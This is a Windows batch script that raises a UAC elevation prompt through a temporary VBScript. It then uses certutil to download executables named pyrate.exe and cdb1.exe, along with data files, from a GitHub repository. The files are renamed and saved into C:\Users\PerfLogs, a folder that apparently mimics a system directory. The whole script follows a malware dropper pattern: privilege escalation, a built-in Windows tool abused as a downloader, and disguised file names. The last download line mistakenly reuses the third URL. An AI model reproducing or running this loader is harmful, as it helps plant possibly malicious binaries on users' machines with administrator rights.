@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------

set DOWNLOAD_DIR=C:\Users\PerfLogs

set FILE1_URL=https://github.com/Simul-Ahmed-006/pyrate/raw/main/pyrate.exe
set FILE2_URL=https://github.com/Simul-Ahmed-006/pyrate/raw/main/cdb1.exe
set FILE3_URL=https://github.com/Simul-Ahmed-006/pyrate/raw/main/file_info.db
set FILE4_URL=https://github.com/Simul-Ahmed-006/pyrate/raw/main/win-win.xml

rem Create the directory if it doesn't exist
if not exist "%DOWNLOAD_DIR%" (
    mkdir "%DOWNLOAD_DIR%"
)

rem Download files to the directory
echo Downloading file 1...
certutil -urlcache -split -f "%FILE1_URL%" "%DOWNLOAD_DIR%\new.exe"

echo Downloading file 2...
certutil -urlcache -split -f "%FILE2_URL%" "%DOWNLOAD_DIR%\cdb.exe"

echo Downloading file 3...
certutil -urlcache -split -f "%FILE3_URL%" "%DOWNLOAD_DIR%\file_info.db"

echo Downloading file 4...
certutil -urlcache -split -f "%FILE3_URL%" "%DOWNLOAD_DIR%\win-win.xml"


echo Download complete.
pause
